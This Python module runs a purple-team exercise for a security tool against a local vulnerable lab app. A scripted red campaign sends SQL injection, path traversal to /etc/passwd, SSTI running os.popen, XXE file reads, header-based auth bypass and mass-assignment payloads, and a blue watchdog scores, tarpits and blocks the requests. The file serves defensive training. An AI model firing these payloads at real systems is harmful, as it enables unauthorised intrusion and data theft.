"""Purple-team battle mode — red vs blue on one lab, shared scoreboard.

`suijin battle` boots the blue_target lab, clears blue-team state, then runs
a scripted red campaign (recon -> auth attacks -> access attacks -> injection
chain) while an embedded blue watchdog tails the live traffic log, scores
every request with the REAL production scorer, and deploys real defenses
(tarpits are enforced by the lab itself; blocks are simulated at battle
level). Live scoreboard, then a full engagement report.

Offline: the red side is scripted (no LLM), the blue side is pattern-based.
"""

from __future__ import annotations

import json
import time
from dataclasses import dataclass, field
from pathlib import Path

import requests
from rich.console import Console
from rich.live import Live
from rich.table import Table


def score_request(req, profile, **kw):
    """Blue scorer via the service seam (no tools->core import)."""
    from suijin.modules.tools.lib.services import get as _service

    fn = _service("traffic_scorer")
    return fn(req, profile, **kw)


console = Console()

FLAG_RE = "FLAG{"


def _notify(title: str, message: str) -> None:
    """Fire operator notifications if suijin/notify.json is configured."""
    try:
        from suijin.modules.ops.lib.notify import send

        send(title, message)
    except Exception:
        pass  # notifications must never break a battle


@dataclass
class BattleState:
    red_flags: list[str] = field(default_factory=list)
    red_requests: int = 0
    red_denied: int = 0
    red_classes_hit: list[str] = field(default_factory=list)
    latencies: list[float] = field(default_factory=list)
    blue_detected: int = 0
    blue_tarpitted: int = 0
    blue_blocked: bool = False
    blue_block_at: int | None = None  # request index when block landed
    detection_by_type: dict = field(default_factory=dict)
    events: list[str] = field(default_factory=list)

    def red_score(self) -> int:
        return 100 * len(self.red_flags) + 25 * len(set(self.red_classes_hit))

    def blue_score(self) -> int:
        base = 10 * self.blue_detected + 25 * self.blue_tarpitted
        return base + (50 if self.blue_blocked else 0)


# ── Blue watchdog — tails the traffic log, scores, defends ─────────────


class BlueWatchdog:
    """Pattern-based blue brain: same scorer/thresholds as production."""

    SUSPICIOUS = 5  # tarpit (matches blue_config suspicious_threshold)
    CRITICAL = 8  # block  (matches blue_config critical_threshold)

    def __init__(self, state: BattleState, traffic_log: Path, tarpit_file: Path):
        self.state = state
        self.log = Path(traffic_log)
        self.tarpit_file = Path(tarpit_file)
        self._seen_lines = 0
        self._tarpitted: set[str] = set()
        self._blocked_ips: set[str] = set()

    def poll(self) -> None:
        """Process any new traffic-log lines (called each scoreboard tick)."""
        entries = self._new_entries()
        for e in entries:
            self._judge(e)

    def _new_entries(self) -> list[dict]:
        if not self.log.exists():
            return []
        lines = self.log.read_text(errors="ignore").splitlines()
        new = lines[self._seen_lines :]
        self._seen_lines = len(lines)
        out = []
        for line in new:
            try:
                out.append(json.loads(line))
            except ValueError:
                continue
        return out

    def _judge(self, entry: dict) -> None:
        ip = str(entry.get("ip", ""))
        verdict = score_request(entry, {"methods": {"GET": 1, "POST": 1}, "ips": set(), "avg_body_size": 1000})
        score = verdict["score"]
        if score >= self.SUSPICIOUS:
            self.state.blue_detected += 1
            for sig in verdict.get("signals", []):
                self.state.detection_by_type[sig] = self.state.detection_by_type.get(sig, 0) + 1
            self.state.events.append(f"blue: {ip} score {score} ({', '.join(verdict['signals'][:3])}) -> DECEIVE")
            self._tarpit(ip, score)
        if score >= self.CRITICAL and ip not in self._blocked_ips:
            self._blocked_ips.add(ip)
            self.state.blue_blocked = True
            self.state.blue_block_at = self.state.red_requests
            self.state.events.append(f"blue: {ip} score {score} -> BLOCK")
            _notify("suijin battle", f"blue BLOCKED {ip} (score {score})")

    def _tarpit(self, ip: str, score: int) -> None:
        if ip and ip not in self._tarpitted:
            self._tarpitted.add(ip)
            self.state.blue_tarpitted += 1
        try:
            from suijin.modules.blueteam.lib.blue.defense import tarpit as _tarpit_protocol

            _tarpit_protocol.engage(ip, delay=min(3.0 + score * 0.5, 15.0), path=self.tarpit_file)
        except Exception:  # noqa: BLE001 — never break a battle
            # inline fallback, same protocol shape ({"delay", "since"})
            state = {}
            if self.tarpit_file.exists():
                try:
                    state = json.loads(self.tarpit_file.read_text())
                except ValueError:
                    state = {}
            state[ip] = {"delay": min(3.0 + score * 0.5, 15.0), "since": time.time()}
            self.tarpit_file.write_text(json.dumps(state))

    def is_blocked(self, ip: str) -> bool:
        return ip in self._blocked_ips


# ── Red campaign — scripted multi-class attacks ────────────────────────


def _phase(name: str):
    console.print(f"\n[bold red]── RED PHASE: {name.upper()} ──[/]")


def run_red_campaign(base_url: str, state: BattleState, watchdog: BlueWatchdog, session: requests.Session) -> None:
    ip = "127.0.0.1"

    def fire(method: str, path: str, cls: str = "", **kw) -> requests.Response | None:
        if watchdog.is_blocked(ip):
            state.red_denied += 1
            state.events.append(f"red: {method} {path} DENIED (blocked)")
            return None
        state.red_requests += 1
        t0 = time.monotonic()
        try:
            r = session.request(method, base_url + path, timeout=20, **kw)
        except requests.RequestException:
            return None
        state.latencies.append(time.monotonic() - t0)
        if FLAG_RE in r.text:
            import re

            for flag in re.findall(r"FLAG\{[^}]+\}", r.text):
                if flag not in state.red_flags:
                    state.red_flags.append(flag)
                    state.events.append(f"red: captured {flag}")
                    _notify("suijin battle", f"red captured {flag}")
        if cls and cls not in state.red_classes_hit:
            ok = r.status_code < 500
            if ok:
                state.red_classes_hit.append(cls)
        return r

    # Phase 1: recon
    _phase("recon")
    fire("GET", "/", "recon")
    fire("GET", "/health", "recon")
    fire("GET", "/debug/state", "info_disclosure")

    # Phase 2: auth attacks
    _phase("auth attacks")
    fire("POST", "/auth/login", "sqli", json={"username": "admin' OR '1'='1", "password": "x"})
    r = fire(
        "POST",
        "/auth/register",
        "mass_assignment",
        json={"username": f"battle{int(time.time())}", "password": "p", "role": "admin"},
    )
    token = (
        r.json().get("token")
        if r is not None and r.headers.get("content-type", "").startswith("application/json")
        else None
    )
    hdrs = {"Authorization": f"Bearer {token}"} if token else {}

    # Phase 3: access attacks
    _phase("access attacks")
    fire("GET", "/api/users/1", "idor", headers=hdrs)
    fire("GET", "/api/documents/1/download?path=../../../etc/passwd", "traversal", headers=hdrs)
    fire("GET", "/admin", "auth_bypass", headers={"X-Admin": "true"})

    # Phase 4: injection chain
    _phase("injection chain")
    fire("GET", "/api/templates/test?data={{__import__('os').popen('id').read()}}", "ssti")
    fire(
        "POST",
        "/api/export",
        "xxe",
        data='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><data>&xxe;</data>',
        headers={"Content-Type": "application/xml"},
    )
    if token:
        fire("POST", "/api/execute", "command_injection", json={"command": "id"}, headers=hdrs)

    # Phase 5: final sweep
    _phase("final sweep")
    fire("GET", "/api/search", "sqli", params={"q": "x", "field": "username UNION SELECT 1,2,3,4"})
    fire("GET", "/graphql?query={__schema{types{name}}}", "graphql_recon")


# ── Scoreboard & report ────────────────────────────────────────────────


def _scoreboard(state: BattleState) -> Table:
    t = Table.grid(expand=True)
    t.add_column(justify="left")
    t.add_column(justify="right")
    fast = state.latencies[:5] if state.latencies else []
    slow = state.latencies[-5:] if state.latencies else []
    avg_fast = sum(fast) / len(fast) if fast else 0
    avg_slow = sum(slow) / len(slow) if slow else 0
    t.add_row("[bold red]RED[/]", "")
    t.add_row("  flags", f"{len(state.red_flags)} ({', '.join(state.red_flags) or '—'})")
    t.add_row("  attack classes landed", f"{len(set(state.red_classes_hit))}")
    t.add_row("  requests / denied", f"{state.red_requests} / {state.red_denied}")
    t.add_row("[bold #7d9bff]BLUE[/]", "")
    t.add_row("  attacks detected", f"{state.blue_detected}")
    t.add_row("  tarpits / blocked", f"{state.blue_tarpitted} / {'yes' if state.blue_blocked else 'no'}")
    t.add_row("[dim]latency early vs late[/]", f"[dim]{avg_fast:.2f}s vs {avg_slow:.2f}s[/]")
    return t


def battle_report(state: BattleState, duration_s: float) -> str:
    rs, bs = state.red_score(), state.blue_score()
    winner = "RED" if rs > bs else "BLUE" if bs > rs else "DRAW"
    lines = [
        "# Suijin Battle Report",
        "",
        f"**Duration**: {duration_s:.0f}s  ·  **Winner**: {winner} (red {rs} — blue {bs})",
        "",
        "## Red",
        f"- Flags: {len(state.red_flags)} {state.red_flags}",
        f"- Attack classes landed: {sorted(set(state.red_classes_hit)) or '—'}",
        f"- Requests: {state.red_requests} ({state.red_denied} denied by blue blocks)",
        "",
        "## Blue",
        f"- Attacks detected: {state.blue_detected}",
        f"- Tarpits deployed: {state.blue_tarpitted}",
        f"- Network block: {'yes (at request #' + str(state.blue_block_at) + ')' if state.blue_blocked else 'no'}",
        f"- Detections by type: {state.detection_by_type or '—'}",
        "",
        "## Event log",
    ]
    lines += [f"- {e}" for e in state.events[-40:]]
    return "\n".join(lines)


def run_battle(port: int | None = None, watch_rounds: int = 40) -> dict:
    """Boot lab, run the battle, return the final state dict."""
    import subprocess
    import sys
    import urllib.request

    if port is None:
        from suijin.modules.platform.lib.constants import BLUE_LAB_PORT

        port = BLUE_LAB_PORT
    from suijin.modules.platform.lib.constants import (
        BLUE_KG_PATH,
        BLUE_TARPIT_FILE,
        BLUE_TRAFFIC_LOG,
    )

    base_url = f"http://127.0.0.1:{port}"
    log = Path(BLUE_TRAFFIC_LOG)
    tarpit = Path(BLUE_TARPIT_FILE)
    kg = Path(BLUE_KG_PATH)

    # fresh battlefield
    for f in (log, tarpit, kg):
        f.unlink(missing_ok=True)

    # stale process cleanup (same dance blueteamer does)
    try:
        out = subprocess.run(["lsof", "-ti", f":{port}"], capture_output=True, text=True, timeout=3).stdout
        for pid in out.split():
            subprocess.run(["kill", pid.strip()], timeout=3)
    except Exception:
        pass
    time.sleep(0.4)

    lab = subprocess.Popen(
        [
            sys.executable,
            str(Path(__file__).resolve().parents[3] / "lab" / "blue_target" / "vulnerable_app.py"),
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    try:
        for _ in range(20):
            time.sleep(0.3)
            try:
                urllib.request.urlopen(base_url + "/", timeout=1)
                break
            except Exception:
                continue

        state = BattleState()
        watchdog = BlueWatchdog(state, log, tarpit)
        session = requests.Session()
        t0 = time.monotonic()

        with Live(_scoreboard(state), console=console, refresh_per_second=2) as live:
            # phase the campaign through the watch loop so blue reacts live
            import threading

            red_done = threading.Event()

            def red():
                try:
                    run_red_campaign(base_url, state, watchdog, session)
                finally:
                    red_done.set()

            threading.Thread(target=red, daemon=True).start()
            ticks = 0
            while not red_done.is_set() and ticks < watch_rounds * 5:
                watchdog.poll()
                live.update(_scoreboard(state))
                time.sleep(0.25)
                ticks += 1
            # let final log lines flush & be judged
            for _ in range(8):
                watchdog.poll()
                time.sleep(0.25)
            live.update(_scoreboard(state))
        duration = time.monotonic() - t0

        report = battle_report(state, duration)
        out_dir = Path(__file__).resolve().parents[4] / "suijin_agent" / "reports"
        out_dir.mkdir(parents=True, exist_ok=True)
        rp = out_dir / f"battle_{time.strftime('%Y%m%d_%H%M%S')}.md"
        rp.write_text(report)
        console.print(Panel(report, title="battle report"))
        console.print(f"[dim]saved: {rp}[/]")

        result = {
            "red_score": state.red_score(),
            "blue_score": state.blue_score(),
            "flags": state.red_flags,
            "classes": sorted(set(state.red_classes_hit)),
            "detected": state.blue_detected,
            "tarpitted": state.blue_tarpitted,
            "blocked": state.blue_blocked,
            "requests": state.red_requests,
            "denied": state.red_denied,
            "duration_s": duration,
        }
        return result
    finally:
        lab.terminate()
        try:
            lab.wait(timeout=5)
        except subprocess.TimeoutExpired:
            lab.kill()


from rich.panel import Panel  # noqa: E402 — used in run_battle
